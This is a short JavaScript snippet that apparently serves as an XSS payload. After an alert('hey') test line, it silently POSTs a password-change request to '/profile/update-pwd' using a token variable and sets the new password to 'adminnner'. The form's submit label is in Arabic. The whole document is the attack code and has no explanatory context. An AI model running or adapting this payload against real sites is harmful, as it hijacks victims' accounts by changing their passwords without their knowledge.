alert("hey");


var data = new URLSearchParams();
data.append('z', req_id);
data.append('pwd[new]', 'adminnner');
data.append('pwd[new2]', 'adminnner');
data.append('submit', 'غير كلمة السر');

// Send the POST request
fetch('/profile/update-pwd', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: data.toString()
})
.then(response => response.json())  // Assuming the response is in JSON format
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  console.error('Error:', error);
});
